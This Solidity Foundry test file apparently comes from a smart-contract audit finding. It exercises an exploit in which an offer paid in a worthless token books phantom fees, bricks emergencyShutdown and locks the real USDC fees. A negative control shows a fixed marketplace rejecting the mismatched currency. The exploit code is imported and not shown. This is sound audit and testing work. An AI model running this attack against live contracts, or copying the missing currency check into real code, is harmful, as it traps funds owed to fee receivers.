// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    Marketplace,
    MarketplaceFixed,
    MiniToken,
    OfferParams,
    OfferRequest,
    MismatchedCurrency
} from "./62542-h-05-currency-validation-missing-in-listing-and-offer-reques.sol";

contract CurrencyValidationMissingTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant FEE_RECEIVER = 0x0000000000000000000000000000000000000055;
    address internal constant SELLER = 0x0000000000000000000000000000000000000077;

    uint256 internal constant PRICE = 40_000_000_000; // 40,000 USDC @ 6 decimals
    uint256 internal constant FEE = 1_000_000_000; //  1,000 USDC fee (2.5%)

    function _offer(address currency, address requester) internal view returns (OfferParams memory p) {
        p.request = OfferRequest({
            tokenContractAddress: address(0),
            tokenId: 0,
            price: PRICE,
            offerCurrency: currency,
            deadline: type(uint256).max,
            requester: requester,
            chainId: block.chainid
        });
        p.sig = "";
        p.receiver = SELLER;
        p.receiverSig = "";
    }

    // ── Exploit: a worthless-token offer books a phantom fee that permanently
    //    bricks emergencyShutdown, locking the real USDC fees. ──
    function test_exploit_phantomFee_locksRealFees() public {
        Exploit e = new Exploit();
        e.run();

        // totalPendingFees was inflated to 2F, but only F is truly backed by USDC.
        assertEq(e.buggyTotalPendingFees(), 2 * FEE, "totalPendingFees inflated to 2F");
        assertEq(e.backedUsdc(), FEE, "contract holds only F real USDC");
        assertEq(e.phantomFees(), FEE, "F of fees are phantom (unbacked)");

        // The only fee-withdrawal path is permanently bricked.
        assertTrue(e.shutdownReverted(), "emergencyShutdown reverts (2F > F held)");

        // The real F of USDC is now locked; recorded on the marker at the SINK.
        assertEq(e.lockedRealUsdc(), FEE, "real USDC fees locked");
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), FEE, "marker records locked magnitude at SINK");

        // acceptedCurrency was NOT zeroed: shutdown never completed, fees stay stuck.
        Marketplace mkt = Marketplace(e.marketplaceAddr());
        assertEq(mkt.acceptedCurrency(), e.usdcAddr(), "shutdown did not complete");
        assertEq(mkt.totalPendingFees(), 2 * FEE, "over-booked total persists");
        MiniToken usdc = MiniToken(e.usdcAddr());
        assertEq(usdc.balanceOf(e.marketplaceAddr()), FEE, "real fees remain trapped");
        assertEq(usdc.balanceOf(FEE_RECEIVER), 0, "feeReceiver received nothing");
    }

    // ── Negative control: with the offerCurrency==acceptedCurrency check, the
    //    worthless-token offer reverts, totalPendingFees stays fully backed, and
    //    emergencyShutdown pays the feeReceiver the real fees. ──
    function test_control_currencyCheck_keepsFeesWithdrawable() public {
        MiniToken usdc = new MiniToken("USD Coin", "USDC", 6);
        MiniToken worthless = new MiniToken("Worthless", "WORTH", 18);
        MarketplaceFixed mkt = new MarketplaceFixed(address(usdc), address(this), FEE_RECEIVER, 250);

        // This test contract acts as the requester for both offers.
        usdc.mint(address(this), PRICE);
        worthless.mint(address(this), PRICE);
        usdc.approve(address(mkt), type(uint256).max);
        worthless.approve(address(mkt), type(uint256).max);

        // Legit USDC offer succeeds and books a fully-backed fee.
        OfferParams[] memory legit = new OfferParams[](1);
        legit[0] = _offer(address(usdc), address(this));
        mkt.acceptOffer(legit);
        assertEq(mkt.totalPendingFees(), FEE, "backed fee booked");
        assertEq(usdc.balanceOf(address(mkt)), FEE, "real USDC held");

        // Worthless-token offer is rejected by the currency guard.
        OfferParams[] memory atk = new OfferParams[](1);
        atk[0] = _offer(address(worthless), address(this));
        vm.expectRevert(MismatchedCurrency.selector);
        mkt.acceptOffer(atk);

        // totalPendingFees is still exactly F and fully withdrawable.
        assertEq(mkt.totalPendingFees(), FEE, "no phantom fee booked");
        mkt.emergencyShutdown();
        assertEq(usdc.balanceOf(FEE_RECEIVER), FEE, "feeReceiver paid the real fees");
        assertEq(mkt.acceptedCurrency(), address(0), "shutdown completed cleanly");
    }
}
